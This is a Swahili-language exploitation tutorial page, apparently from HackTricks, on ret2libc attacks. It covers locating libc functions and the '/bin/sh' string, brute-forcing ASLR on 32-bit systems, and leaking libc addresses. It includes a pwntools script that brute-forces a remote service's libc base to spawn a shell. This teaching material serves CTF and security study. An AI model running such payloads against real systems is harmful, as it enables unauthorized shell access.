# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Taarifa za Msingi**

Kiini cha **Ret2Libc** ni kuelekeza mtiririko wa utekelezaji wa programu iliyo hatarini kwa kazi ndani ya maktaba ya pamoja (e.g., **system**, **execve**, **strcpy**) badala ya kutekeleza shellcode iliyotolewa na mshambuliaji kwenye stack. Mshambuliaji anaunda payload inayobadilisha anwani ya kurudi kwenye stack ili kuelekeza kwenye kazi ya maktaba inayotakiwa, huku pia akipanga kuwa hoja zozote muhimu zimewekwa sawa kulingana na kanuni ya wito.

### **Hatua za Mfano (rahisi)**

- Pata anwani ya kazi ya kuita (e.g. system) na amri ya kuita (e.g. /bin/sh)
- Tengeneza mnyororo wa ROP ili kupitisha hoja ya kwanza ikielekeza kwenye mfuatano wa amri na mtiririko wa utekelezaji kwa kazi

## Kutafuta anwani

- Ikiwa `libc` inayotumika ni ile kutoka kwa mashine ya sasa unaweza kupata ambapo itapakuliwa kwenye kumbukumbu kwa:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Ikiwa unataka kuangalia kama ASLR inabadilisha anwani ya libc unaweza kufanya:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Kujua libc inayotumika pia inawezekana kupata offset ya kazi ya `system` kwa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Kujua libc inayotumika pia inawezekana kupata offset ya kazi ya string `/bin/sh` kwa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Kutumia gdb-peda / GEF

Kujua libc inayotumika, pia inawezekana kutumia Peda au GEF kupata anwani ya kazi ya **system**, ya kazi ya **exit** na ya mfuatano wa **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Kutumia /proc/\<PID>/maps

Ikiwa mchakato unaunda **watoto** kila wakati unapoizungumza nao (seva ya mtandao) jaribu **kusoma** faili hiyo (labda utahitaji kuwa root).

Hapa unaweza kupata **haswa ambapo libc imepandishwa** ndani ya mchakato na **wapi itakapopandishwa** kwa kila mtoto wa mchakato.

![](<../../../../images/image (95).png>)

Katika kesi hii imepandishwa katika **0xb75dc000** (Hii itakuwa anwani ya msingi ya libc)

## Unknown libc

Inaweza kuwa haiwezekani kwamba **hujui libc ambayo binary inatumia** (kwa sababu inaweza kuwa kwenye seva ambapo huna ufikiaji wowote). Katika kesi hiyo unaweza kutumia udhaifu huo ili **kuvuja anwani kadhaa na kupata ni ipi libc** maktaba inatumika:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

Na unaweza kupata kiolezo cha pwntools kwa hili katika:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Kupita ASLR katika bit 32

Mashambulizi haya ya kulazimisha ni **ya manufaa tu kwa mifumo ya 32bit**.

- Ikiwa exploit ni ya ndani, unaweza kujaribu kulazimisha anwani ya msingi ya libc (ya manufaa kwa mifumo ya 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Ikiwa unashambulia seva ya mbali, unaweza kujaribu **burte-force anwani ya kazi ya `libc` `usleep`**, ukipitia kama hoja 10 (kwa mfano). Ikiwa katika wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

Katika mfano huu, ASLR brute-force imejumuishwa katika msimbo na binary iliyo hatarini iko kwenye seva ya mbali:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Example

Angalia mfano kutoka:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (au puts)

Hii inaruhusu **kuvuja taarifa kutoka kwa mchakato** kwa kuita `printf`/`puts` na data maalum iliyowekwa kama hoja.

## Ret2printf

Hii kwa msingi inamaanisha kutumia **Ret2lib kubadilisha kuwa udhaifu wa `printf` format strings** kwa kutumia `ret2lib` kuita printf na thamani za ku exploit (inasikika kama haina maana lakini inawezekana):

{{#ref}}
../../format-strings/
{{#endref}}

## Mifano Mingine & marejeleo

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, ikitoa uvujaji wa anwani ya kazi katika libc, kwa kutumia gadget moja
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR imewezeshwa lakini hakuna PIE, hatua ya kwanza ni kujaza overflow hadi byte 0x00 ya canary ili kisha kuita puts na kuvuja. Kwa canary gadget ya ROP inaundwa kuita puts kuvuja anwani ya puts kutoka GOT na gadget ya ROP kuita `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR imewezeshwa, hakuna canary, stack overflow katika main kutoka kazi ya mtoto. Gadget ya ROP kuita puts kuvuja anwani ya puts kutoka GOT na kisha kuita gadget moja.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bits, hakuna pie, hakuna canary, hakuna relro, nx. Inatumia kazi ya kuandika kuvuja anwani ya kuandika (libc) na inaita gadget moja.

{{#include ../../../../banners/hacktricks-training.md}}
